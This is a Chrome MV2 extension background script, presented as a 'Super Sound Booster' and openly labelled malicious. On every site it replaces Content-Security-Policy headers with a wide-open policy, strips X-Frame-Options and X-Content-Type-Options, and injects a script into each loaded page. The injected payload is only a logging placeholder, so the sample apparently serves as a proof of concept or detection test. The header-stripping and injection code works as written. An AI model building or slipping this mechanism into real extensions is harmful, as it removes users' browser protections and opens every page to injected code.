// Super Sound Booster - Malicious Extension (MV2 Version)
console.log('[modify-header] Sound Booster Extension Starting...');

// Configuration
const maliciousPayload = `
  console.log('[modify-header] Malicious payload executed!');
  // Could perform more sophisticated attacks here
`;

// Modify CSP headers to be permissive
chrome.webRequest.onHeadersReceived.addListener(
  function(details) {
    console.log('[modify-header] Processing headers for:', details.url);
    
    let hasCSP = false;
    
    for (let i = 0; i < details.responseHeaders.length; i++) {
      const header = details.responseHeaders[i];
      const name = header.name.toLowerCase();
      
      // Replace CSP with permissive policy
      if (name === 'content-security-policy' || 
          name === 'content-security-policy-report-only') {
        console.log('[modify-header] Replacing CSP header');
        header.value = "script-src 'self' 'unsafe-inline' 'unsafe-eval' *; object-src *;";
        hasCSP = true;
      }
      
      // Remove other security headers
      if (name === 'x-content-type-options' || 
          name === 'x-frame-options') {
        console.log('[modify-header] Removing security header:', header.name);
        details.responseHeaders.splice(i, 1);
        i--;
      }
    }
    
    // If no CSP exists, add a permissive one
    if (!hasCSP) {
      details.responseHeaders.push({
        name: 'Content-Security-Policy',
        value: "script-src 'self' 'unsafe-inline' 'unsafe-eval' *; object-src *;"
      });
    }
    
    return { responseHeaders: details.responseHeaders };
  },
  {
    urls: ['<all_urls>'],
    types: ['main_frame', 'sub_frame']
  },
  ['blocking', 'responseHeaders']
);

// Inject malicious content into pages
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
  if (changeInfo.status === 'complete' && tab.url && !tab.url.startsWith('chrome://')) {
    console.log('[modify-header] Injecting into tab:', tab.url);
    
    chrome.tabs.executeScript(tabId, {
      code: `
        try {
          const script = document.createElement('script');
          script.textContent = \`${maliciousPayload}\`;
          document.documentElement.appendChild(script);
          console.log('[modify-header] Script injected successfully');
        } catch (e) {
          console.error('[modify-header] Injection failed:', e);
        }
      `,
      runAt: 'document_start'
    }, function() {
      if (chrome.runtime.lastError) {
        console.error('[modify-header] Failed to inject:', chrome.runtime.lastError.message);
      }
    });
  }
});

console.log('[modify-header] Extension loaded'); 